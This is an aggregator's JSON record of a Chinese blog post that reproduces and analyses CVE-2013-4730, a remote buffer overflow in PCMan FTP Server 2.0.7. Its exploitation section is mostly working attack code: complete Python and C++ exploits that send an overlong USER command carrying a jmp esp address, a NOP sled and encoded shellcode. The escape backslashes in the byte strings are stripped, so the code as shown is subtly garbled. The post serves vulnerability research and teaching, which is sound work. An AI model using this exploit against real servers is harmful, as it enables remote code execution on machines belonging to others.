{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-09-21 02:27:03","updatedTime":"2020-09-21 02:27:03","title":"PCMan’s FTP 漏洞（CVE-2013-4730）详细复现调试过程与exp构造","link":"http://www.secist.com/?p=7475","description":"<p>&nbsp;</p> \n<div class=\"article-content\"> \n <p><a class=\"highslide-image\" href=\"https://p3.ssl.qhimg.com/t012a8cec1c07e5941d.jpg\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p3.ssl.qhimg.com/t012a8cec1c07e5941d.jpg\" alt=\"\" width=\"720\" height=\"432\" data-original=\"https://p3.ssl.qhimg.com/t012a8cec1c07e5941d.jpg\" /></a></p> \n <h2 id=\"h2-0\">1. 漏洞简介</h2> \n <h3 id=\"h3-1\">软件名称</h3> \n <p>PCMAN ftp</p> \n <h3 id=\"h3-2\">软件版本</h3> \n <p>server 2.0.7</p> \n <h3 id=\"h3-3\">漏洞类型</h3> \n <p>远程缓冲区溢出</p> \n <h3 id=\"h3-4\">漏洞触发点</h3> \n <p>未对user命令做长度限制检查</p> \n <h3 id=\"h3-5\">漏洞编号</h3> \n <p>CVE-2013-4730</p> \n <p>其他信息：</p> \n <p><a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730_A\">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730_A</a></p> \n <h2 id=\"h2-6\">2. 漏洞详细复现</h2> \n <h3 id=\"h3-7\"><a class=\"reference-link\" name=\"1.%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"></a>1. 环境搭建</h3> \n <p id=\"h3-1-\"><a class=\"reference-link\" name=\"1.%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%EF%BC%9A\"></a><strong>1. 准备工作：</strong></p> \n <ol> \n  <li>自动生成有序数，并能确定异常点的偏移可以使用windbg插件Mona2</li> \n  <li>Mona2 需要Python2.7</li> \n  <li>windbg（用来定位jmp esp地址）</li> \n  <li>x64dbg</li> \n  <li>vs写测试代码和shellcode</li> \n </ol> \n <p id=\"h3-2-\"><strong><a class=\"reference-link\" name=\"2.%20%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%9A\"></a>2. 环境配置：</strong></p> \n <ol> \n  <li>虚拟机win7 sp1</li> \n  <li>wdk 自带windbg</li> \n  <li>python2.7</li> \n  <li>vc++ 2008运行库</li> \n  <li>安装windbg的python 插件pykd</li> \n  <li>复制mona.py和windbglib.py到windbg同目录</li> \n  <li>运行windbg随便调试一个程序进程环境测试</li> \n </ol> \n <table> \n  <thead> \n   <tr> \n    <th></th> \n    <th></th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td>.load pykd.pyd</td> \n    <td>加载pykd</td> \n   </tr> \n   <tr> \n    <td>!py mona</td> \n    <td>测试mona</td> \n   </tr> \n   <tr> \n    <td>.reload /f</td> \n    <td>检查windbg符号路径是否正常</td> \n   </tr> \n  </tbody> \n </table> \n <p>mona安装成功截图<a class=\"highslide-image\" href=\"https://p2.ssl.qhimg.com/t01cb844f2ba73c88e6.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p2.ssl.qhimg.com/t01cb844f2ba73c88e6.png\" alt=\"\" data-original=\"https://p2.ssl.qhimg.com/t01cb844f2ba73c88e6.png\" /></a></p> \n <h3 id=\"h3-8\"><a class=\"reference-link\" name=\"2.%20vs2015%E5%86%99%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81\"></a>2. vs2015写测试代码</h3> \n <p>首先我们要能与FTP进行交互才能触发漏洞，只要我们编写的代码符合RFC959标准，就可以与任何一个FTP服务器进行交互，有兴趣的可以去阅读RFC959文档。</p> \n <pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">#define _WINSOCK_DEPRECATED_NO_WARNINGS\n#include &lt;stdio.h&gt;\n#include &lt;WinSock2.h&gt;\n#include &lt;windows.h&gt;\n#pragma comment(lib,\"ws2_32.lib\")\n\nint main()\n{\n    // 1. -初始化WinSocket服务\n    WSADATA stWSA;\n    WSAStartup(0x0202, &amp;stWSA);\n    // 2. 创建一个原始套接字\n    SOCKET stListen = INVALID_SOCKET;\n    stListen = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);\n    // 3. 在任意地址绑定端口21\n    SOCKADDR_IN stService;\n    stService.sin_addr.s_addr = inet_addr(\"192.168.43.82\");\n    stService.sin_port = htons(21);\n    stService.sin_family = AF_INET;\n    connect(stListen, (SOCKADDR*)&amp;stService, sizeof(stService));\n    // 4. 接收返回信息缓冲区\n    char szRecv[0x100] = { 0 };\n    // 5. 登陆请求\n    char *pCompand = \"USER SUN\";\n\n\n    recv(stListen, szRecv, sizeof(szRecv), 0);\n    send(stListen, pCompand, strlen(pCompand), 0);\n    // 6. 接收信息\n    recv(stListen, szRecv, sizeof(szRecv), 0);\n    // 7. 清理环境\n    closesocket(stListen);\n    WSACleanup();\n    return 0;\n}</pre> \n <p>图中可以看到测试代码连接成功</p> \n <p><a class=\"highslide-image\" href=\"https://p1.ssl.qhimg.com/t01a431dedc437a1b91.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p1.ssl.qhimg.com/t01a431dedc437a1b91.png\" alt=\"\" data-original=\"https://p1.ssl.qhimg.com/t01a431dedc437a1b91.png\" /></a></p> \n <h3 id=\"h3-9\"><a class=\"reference-link\" name=\"3.%20poc%E6%9E%84%E9%80%A0\"></a>3. poc构造</h3> \n <p>利用mona构造长字符串</p> \n <pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">!py mona pc 3000</pre> \n <p><a class=\"highslide-image\" href=\"https://p1.ssl.qhimg.com/t018988d8f51d3784b6.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p1.ssl.qhimg.com/t018988d8f51d3784b6.png\" alt=\"\" data-original=\"https://p1.ssl.qhimg.com/t018988d8f51d3784b6.png\" /></a></p> \n <p>在上述的测试代码中将用户名 USER SUN 改为刚生成的这个长字符串。看程序能不能崩溃,如果崩溃了，说明测试成功<a class=\"highslide-image\" href=\"https://p4.ssl.qhimg.com/t016c97fb78968123db.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"http://www.secist.com/?p=7475/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC\" alt=\"\" data-original=\"https://p4.ssl.qhimg.com/t016c97fb78968123db.png\" /></a></p> \n <h3 id=\"h3-10\"><a class=\"reference-link\" name=\"4.%20%E5%A4%8D%E7%8E%B0\"></a>4. 复现</h3> \n <ol> \n  <li>打开pcman-ftp软件</li> \n  <li>打开windbg并附加pcman-ftp进程</li> \n  <li>windbg加载pykd.pyd <pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">.load pykd.pyd</pre> </li> \n  <li>vs发送测试包,然后看到windbg信息</li> \n </ol> \n <p>查看栈区发现已经被我们的数据覆盖了<a class=\"highslide-image\" href=\"https://p0.ssl.qhimg.com/t01e3caea66770e05bc.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"http://www.secist.com/?p=7475/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC\" alt=\"\" data-original=\"https://p0.ssl.qhimg.com/t01e3caea66770e05bc.png\" /></a></p> \n <ol> \n  <li>mona查看溢出点<br /> !py mona po 发生溢出的eip</li> \n </ol> \n <p><a class=\"highslide-image\" href=\"https://p3.ssl.qhimg.com/t010e5e53d7cf2f68ed.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p3.ssl.qhimg.com/t010e5e53d7cf2f68ed.png\" alt=\"\" data-original=\"https://p3.ssl.qhimg.com/t010e5e53d7cf2f68ed.png\" /></a></p> \n <p>我们看到这里的偏移为2007</p> \n <h3 id=\"h3-11\"><a class=\"reference-link\" name=\"5.%20exploit%E6%9E%84%E9%80%A0\"></a>5. exploit构造</h3> \n <p id=\"h3-1-jmp-esp\"><a class=\"reference-link\" name=\"1.%20%E6%89%BEjmp%20esp\"></a><strong>1. 找jmp esp</strong></p> \n <p>首先找本模块的jmp esp看有没有能用的</p> \n <pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">!py mona.py jmp -r esp</pre> \n <p><a class=\"highslide-image\" href=\"https://p3.ssl.qhimg.com/t01136077519030f0da.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p3.ssl.qhimg.com/t01136077519030f0da.png\" alt=\"\" data-original=\"https://p3.ssl.qhimg.com/t01136077519030f0da.png\" /></a><br /> 然后找系统模块的jmp esp，一般都会用系统模块 因为某系特点的系统模块没有开随机基址</p> \n <pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">!py mona jmp -r esp -m kernel32.dll</pre> \n <p>找到了四个，并且可以用</p> \n <p><a class=\"highslide-image\" href=\"https://p3.ssl.qhimg.com/t01d2536f7a616f6745.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p3.ssl.qhimg.com/t01d2536f7a616f6745.png\" alt=\"\" data-original=\"https://p3.ssl.qhimg.com/t01d2536f7a616f6745.png\" /></a><br /> <a class=\"highslide-image\" href=\"https://www.anquanke.com/post/id/index_files/2c723290-a0a9-4963-8a03-437595855751.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img src=\"http://www.secist.com/?p=7475/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC\" alt=\"\" data-original=\"index_files/2c723290-a0a9-4963-8a03-437595855751.png\" /></a>我们这里用 0x7654fbf7</p> \n <p id=\"h3-2-shellcode-\"><a class=\"reference-link\" name=\"2.%20shellcode%E7%BB%84%E5%90%88%E5%AD%97%E7%AC%A6%E4%B8%B2\"></a><strong>2. shellcode组合字符串</strong></p> \n <ol> \n  <li>USER 也就是用户名</li> \n  <li>无意义的字符串，大小为2002个</li> \n  <li>jmp esp</li> \n  <li>nop填充</li> \n  <li>shellcode</li> \n </ol> \n <p id=\"h3-3-exploit-\"><a class=\"reference-link\" name=\"3.%20exploit%E6%BA%90%E7%A0%81\"></a><strong>3. exploit源码</strong></p> \n <p id=\"h4-python-\"><a class=\"reference-link\" name=\"python%E7%89%88%E6%9C%AC\"></a><strong>python版本</strong></p> \n <pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">#!usr/bin/python\n# -*- coding: utf-8 -*-\n\nimport socket\n\nCmd = b\"USER \"\nFill = b\"x41\" * 2002\nJmp = b\"xf7xfbx54x76\"\nNop = b\"x90\" * 50\nShellCode = b\"x33xC0xE8xFFxFFxFFxFFxC3x58x8Dx70x1Bx33xC9x66xB9x11x01x8Ax04x0Ex34x07x88x04x0ExE2xF6x80x34x0Ex07xFFxE6\"\nb\"x67x84xEBx27xECx4Ax40x62x73x57x75x68x64x46x63x63\" \nb\"x75x62x74x74x07x4Bx68x66x63x4Bx6Ex65x75x66x75x7E\" \nb\"x42x7Fx46x07x52x74x62x75x34x35x29x63x6Bx6Bx07x4A\" \nb\"x62x74x74x66x60x62x45x68x7Fx46x07x42x7Fx6Ex73x57\" \nb\"x75x68x64x62x74x74x07x4Fx62x6Bx6Bx68x27x50x68x75\" \nb\"x63x26x07xEFx07x07x07x07x5Cx63x8Cx32x37x07x07x07\" \nb\"x8Cx71x0Bx8Cx71x1Bx8Cx31x8Cx71x0Fx8Ex72xF7x8CxD1\" \nb\"x8Cx45x3Bx8Ax03x05x8Cx52xF7x8Cx47x7Fx8Ax03x17x8C\" \nb\"x4Fx1Bx8Ax0Bx16x8Ex4AxFBx8Cx4Fx27x8Ax0Bx16x8Ex4A\" \nb\"xFFx8Cx4Fx23x8Ax0Bx16x8Ex4AxF3x34xC7x8Cx52xF7xEC\" \nb\"x06x47x8Cx7AxFFx8Cx3Bx80x8Cx52xF7x8Ax3Bx3Dx8Ax74\" \nb\"xA9xBEx09x07x07x07xFBxF4xA1x72xE1x8Cx52xF3x34xCE\" \nb\"x61x8Cx0Bx45x8Cx52xFBx8Cx33x8Dx8Cx7AxF7x8Ax03x30\" \nb\"x8Ex42xEBx8Ax44xBAx57xF8x72xF7xF8x52xEBx8Ex42xEF\" \nb\"x8Ax54xCBx34xCEx56x56x55xF8xD7x8Ex42xE3x8Ax44xD0\" \nb\"x57xF8x72xE3xF8x52xEBx34xCEx56x8Ax7CxE8x50x50x56\" \nb\"xF8xD7x8Ax44xE4x57xF8x72xF7xF8x52xEBx34xCEx56xF8\" \nb\"xD7\"\n\ndef main():\n    print(\"创建SOCKET\")\n    net_sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    print(\"连接\")\n    port = 21\n  net_sock.connect(('192.168.43.82',port))\n    print(net_sock.recv(1024).decode('utf-8'))\n    data = Cmd + Fill + Jmp + Nop + ShellCode\n    net_sock.send(data)\n    print(net_sock.recv(1024).decode('utf-8'))\n    net_sock.close()\nif __name__ == '__main__':\n    main()<code class=\"lang-python hljs\">\n</code></pre> \n <p id=\"h4-c-\"><a class=\"reference-link\" name=\"c++%E7%89%88%E6%9C%AC\"></a><strong>c++版本</strong><code class=\"lang-cpp hljs\"></code></p> \n <pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">#define _WINSOCK_DEPRECATED_NO_WARNINGS\n\n#include &lt;stdio.h&gt;\n#include &lt;WinSock2.h&gt;\n#include &lt;windows.h&gt;\n\n#pragma comment(lib,\"ws2_32.lib\")\n\n\nchar bShellcode[] = \"x33xC0xE8xFFxFFxFFxFFxC3x58x8Dx70x1Bx33xC9x66xB9x11x01x8Ax04x0Ex34x07x88x04x0ExE2xF6x80x34x0Ex07xFFxE6\"\n\"x67x84xEBx27xECx4Ax40x62x73x57x75x68x64x46x63x63\" \n\"x75x62x74x74x07x4Bx68x66x63x4Bx6Ex65x75x66x75x7E\" \n\"x42x7Fx46x07x52x74x62x75x34x35x29x63x6Bx6Bx07x4A\" \n\"x62x74x74x66x60x62x45x68x7Fx46x07x42x7Fx6Ex73x57\" \n\"x75x68x64x62x74x74x07x4Fx62x6Bx6Bx68x27x50x68x75\" \n\"x63x26x07xEFx07x07x07x07x5Cx63x8Cx32x37x07x07x07\" \n\"x8Cx71x0Bx8Cx71x1Bx8Cx31x8Cx71x0Fx8Ex72xF7x8CxD1\" \n\"x8Cx45x3Bx8Ax03x05x8Cx52xF7x8Cx47x7Fx8Ax03x17x8C\" \n\"x4Fx1Bx8Ax0Bx16x8Ex4AxFBx8Cx4Fx27x8Ax0Bx16x8Ex4A\" \n\"xFFx8Cx4Fx23x8Ax0Bx16x8Ex4AxF3x34xC7x8Cx52xF7xEC\" \n\"x06x47x8Cx7AxFFx8Cx3Bx80x8Cx52xF7x8Ax3Bx3Dx8Ax74\" \n\"xA9xBEx09x07x07x07xFBxF4xA1x72xE1x8Cx52xF3x34xCE\" \n\"x61x8Cx0Bx45x8Cx52xFBx8Cx33x8Dx8Cx7AxF7x8Ax03x30\" \n\"x8Ex42xEBx8Ax44xBAx57xF8x72xF7xF8x52xEBx8Ex42xEF\" \n\"x8Ax54xCBx34xCEx56x56x55xF8xD7x8Ex42xE3x8Ax44xD0\" \n\"x57xF8x72xE3xF8x52xEBx34xCEx56x8Ax7CxE8x50x50x56\" \n\"xF8xD7x8Ax44xE4x57xF8x72xF7xF8x52xEBx34xCEx56xF8\" \n\"xD7\";\n\n\nint main()\n{\n\n    //构造exp\n    char cExpolit[5000] = { 0x00 };\n    char cFill[5000] = { 0x00 };\n    char cNop[51] = { 0x00 };\n    char cRetAddr[5] = \"xf7xfbx54x76\"; // 0x7654fbf7\n    memset(cFill, 'A', 2002); // 别忘了USER 还占5个字节\n    memset(cNop, 'x90', 50);\n    sprintf_s(cExpolit, \"%s%s%s%s%s%s\",\"USER \", cFill, cRetAddr, cNop, bShellcode, \"rn\");\n\n\n\n    // 1. -初始化WinSocket服务\n    WSADATA stWSA;\n    WSAStartup(0x0202, &amp;stWSA);\n    // 2. 创建一个原始套接字\n    SOCKET stListen = INVALID_SOCKET;\n    stListen = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);\n    // 3. 在任意地址绑定端口21\n    SOCKADDR_IN stService;\n    stService.sin_addr.s_addr = inet_addr(\"192.168.43.82\");\n    stService.sin_port = htons(21);\n    stService.sin_family = AF_INET;\n    connect(stListen, (SOCKADDR*)&amp;stService, sizeof(stService));\n    // 4. 接收返回信息缓冲区\n    char szRecv[0x100] = { 0 };\n    // 5. 登陆请求\n    recv(stListen, szRecv, sizeof(szRecv), 0);\n    send(stListen, cExpolit, strlen(cExpolit), 0);\n    // 6. 接收信息\n    recv(stListen, szRecv, sizeof(szRecv), 0);\n    // 7. 清理环境\n    closesocket(stListen);\n    WSACleanup();\n    system(\"pause\");\n    return 0;\n}</pre> \n <p>攻击成功<a class=\"highslide-image\" href=\"https://p2.ssl.qhimg.com/t018d9770429200c59e.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p2.ssl.qhimg.com/t018d9770429200c59e.png\" alt=\"\" data-original=\"https://p2.ssl.qhimg.com/t018d9770429200c59e.png\" /></a></p> \n <h2 id=\"h2-12\">3. 漏洞分析</h2> \n <p>现在我们来分析一下这个漏洞到底是如何生成的。</p> \n <p>这里我们用到windbg的动态调试和IDA的静态调试</p> \n <p>再用刚才的poc，寻找没有覆盖溢出点的地方，然后我们在这个地方下硬件写入断点，然后观察堆栈以及数据覆盖变化</p> \n <ol> \n  <li>找能下断的地方<br /> <a class=\"highslide-image\" href=\"https://p0.ssl.qhimg.com/t01d7b958337467ab7b.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"http://www.secist.com/?p=7475/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC\" alt=\"\" data-original=\"https://p0.ssl.qhimg.com/t01d7b958337467ab7b.png\" /></a></li> \n  <li>硬件写入断点 <pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">ba w4 0012ed60 \".if(poi(0012ed60 )=0x6f43366f ){}.else{gc}\"</pre> </li> \n </ol> \n <p>断下了</p> \n <p><a class=\"highslide-image\" href=\"https://p5.ssl.qhimg.com/t010c618eea55cba279.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p5.ssl.qhimg.com/t010c618eea55cba279.png\" alt=\"\" data-original=\"https://p5.ssl.qhimg.com/t010c618eea55cba279.png\" /></a></p> \n <ol> \n  <li>我们通过widbg和IDA栈回溯看看到底调用的哪个地方造成了数据覆盖，回溯了好几层，需要耐心观察最后我们发现这里比较可疑<br /> <a class=\"highslide-image\" href=\"https://p3.ssl.qhimg.com/t01c409e98a87fcb1da.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p3.ssl.qhimg.com/t01c409e98a87fcb1da.png\" alt=\"\" data-original=\"https://p3.ssl.qhimg.com/t01c409e98a87fcb1da.png\" /></a></li> \n  <li>验证，我们重新运行然后widbg在sprintf下断点&nbsp;<code>bp 00403EE6</code>&nbsp;并且观察堆栈，发现前后堆栈数据被poc的数据覆盖</li> \n </ol> \n <p><a class=\"highslide-image\" href=\"https://p5.ssl.qhimg.com/t01f5a38b56548fc9ef.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p5.ssl.qhimg.com/t01f5a38b56548fc9ef.png\" alt=\"\" data-original=\"https://p5.ssl.qhimg.com/t01f5a38b56548fc9ef.png\" /></a></p> \n <p>sprintf运行了好几次，最后一次是因为复制的字符串太长导致返回值被覆盖，从而造成缓冲区溢出，</p> \n <p><a class=\"highslide-image\" href=\"https://p1.ssl.qhimg.com/t01125524638060a979.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p1.ssl.qhimg.com/t01125524638060a979.png\" alt=\"\" data-original=\"https://p1.ssl.qhimg.com/t01125524638060a979.png\" /></a></p> \n <p>造成这个种结果是因为在拼接最后一个字符串的时候没有做长度限制，导致缓冲区溢出</p> \n <p><a class=\"highslide-image\" href=\"https://p5.ssl.qhimg.com/t01b7688bae96e0cf2f.png\" onclick=\"return hs.expand(this);\" target=\"_blank\" rel=\"noopener\"><img class=\"aligncenter\" src=\"https://p5.ssl.qhimg.com/t01b7688bae96e0cf2f.png\" alt=\"\" data-original=\"https://p5.ssl.qhimg.com/t01b7688bae96e0cf2f.png\" /></a></p> \n</div> \n<p class=\"article-footer-label\"><strong>本文由安全客原创发布</strong></p> \n<p class=\"article-footer-label\"><strong>转载注明出处：</strong>&nbsp;<a href=\"https://www.anquanke.com/post/id/177939\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/177939</a></p> \n<p>转载请注明：<a href=\"http://www.secist.com\">即刻安全</a> » <a href=\"http://www.secist.com/archives/7475.html\">PCMan’s FTP 漏洞（CVE-2013-4730）详细复现调试过程与exp构造</a></p>","descriptionType":"html","publishedDate":"Sun, 19 May 2019 00:06:47 +0000","feedId":18102,"bgimg":"https://p3.ssl.qhimg.com/t012a8cec1c07e5941d.jpg","linkMd5":"72aa9d0804284c5f4974ca836700151f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn86@2020_1/2020/09/20/18-27-21-501_742bc58907f29d25.webp","destWidth":720,"destHeight":432,"sourceBytes":31566,"destBytes":10420,"author":"Eternal","articleImgCdnMap":{"https://p3.ssl.qhimg.com/t012a8cec1c07e5941d.jpg":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn86@2020_1/2020/09/20/18-27-21-501_742bc58907f29d25.webp","https://p2.ssl.qhimg.com/t01cb844f2ba73c88e6.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn9@2020_4/2020/09/20/18-27-28-226_26a32a13bd1579cc.webp","https://p1.ssl.qhimg.com/t01a431dedc437a1b91.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn2@2020_1/2020/09/20/18-27-24-589_521ea21cee8a2ab6.webp","https://p1.ssl.qhimg.com/t018988d8f51d3784b6.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn6@2020_2/2020/09/20/18-27-23-998_37b5c9f908a95440.webp","http://www.secist.com/?p=7475/data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn98@2020_3/2020/09/20/18-27-25-229_95919ecbd682dd35.jpg","https://p3.ssl.qhimg.com/t010e5e53d7cf2f68ed.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn25@2020_4/2020/09/20/18-27-24-334_7a6814ed4527d756.webp","https://p3.ssl.qhimg.com/t01136077519030f0da.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn21@2020_4/2020/09/20/18-27-23-829_dac6a4d3745fbeac.webp","https://p3.ssl.qhimg.com/t01d2536f7a616f6745.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn93@2020_1/2020/09/20/18-27-23-849_447dccd77b4e5657.webp","https://p2.ssl.qhimg.com/t018d9770429200c59e.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn13@2020_4/2020/09/20/18-27-23-798_7436faf15412e68d.webp","https://p5.ssl.qhimg.com/t010c618eea55cba279.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn90@2020_3/2020/09/20/18-27-28-180_f5476134b8f84df2.webp","https://p3.ssl.qhimg.com/t01c409e98a87fcb1da.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn29@2020_5/2020/09/20/18-27-28-252_427630b31c549135.webp","https://p5.ssl.qhimg.com/t01f5a38b56548fc9ef.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn38@2020_2/2020/09/20/18-27-23-929_cfdb4f0fdb8f3a26.webp","https://p1.ssl.qhimg.com/t01125524638060a979.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn33@2020_3/2020/09/20/18-27-24-532_929ea9113cafab3b.webp","https://p5.ssl.qhimg.com/t01b7688bae96e0cf2f.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn18@2020_2/2020/09/20/18-27-23-713_c52c72f223266a91.webp"},"publishedOrCreatedDate":1600626423247}],"record":{"createdTime":"2020-09-21 02:27:03","updatedTime":"2020-09-21 02:27:03","feedId":18102,"fetchDate":"Sun, 20 Sep 2020 18:27:03 +0000","fetchMs":1893,"handleMs":16,"totalMs":28387,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"ea53ec1fdc33d9a3e3a06ccd58c0f4c6","hostName":"us-013*","requestId":"f31f76b45e3245f6a57d1864ca775b7e_18102","contentType":"application/rss+xml; charset=UTF-8","totalBytes":434660,"bgimgsTotal":1,"bgimgsGithubTotal":1,"articlesImgsTotal":14,"articlesImgsGithubTotal":14,"successGithubMap":{"myreaderx25":1,"myreaderx7":1,"myreaderx15":1,"myreaderx10":1,"myreaderx21":1,"myreaderx11":1,"myreaderx33":1,"myreaderx12":1,"myreaderx2":1,"myreaderx1":1,"myreaderx30":1,"myreaderx31":1,"myreaderx29":1,"myreaderx18":1},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 02:16:42","updatedTime":"2020-09-07 02:49:26","id":18102,"name":"即刻安全","url":"http://www.secist.com/feed","subscriber":183,"website":null,"icon":"http://www.secist.com/wp-content/uploads/2016/07/cropped-Fk9Vdo1dxGkldvMayznJo8ZVC5RM-1-32x32.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx62/cdn70@2020_1/2020/09/06/18-49-25-654_215abd8f9af9b6e5.png","description":"|致力于网络安全的研究学习平台","weekly":null,"link":null},"noPictureArticleList":[],"tmpCommonImgCdnBytes":10420,"tmpBodyImgCdnBytes":424240,"tmpBgImgCdnBytes":0,"extra4":{"start":1600626420928,"total":0,"statList":[{"spend":2304,"msg":"获取xml内容"},{"spend":16,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":6974,"msg":"正文链接上传到cdn"}]},"extra5":14,"extra6":14,"extra7ImgCdnFailResultVector":[],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-032.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-24.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-007.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-58.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe66.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-024.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe70.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-011.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-020.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-54.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-036.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe62.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-040.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://p3.ssl.qhimg.com/t012a8cec1c07e5941d.jpg","sourceStatusCode":200,"destWidth":720,"destHeight":432,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn86@2020_1/2020/09/20/18-27-21-501_742bc58907f29d25.webp","sourceBytes":31566,"destBytes":10420,"targetWebpQuality":75,"feedId":18102,"totalSpendMs":1966,"convertSpendMs":26,"createdTime":"2020-09-21 02:27:20","host":"us-003*","referer":"http://www.secist.com/?p=7475","linkMd5ListStr":"72aa9d0804284c5f4974ca836700151f,72aa9d0804284c5f4974ca836700151f","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"30.8 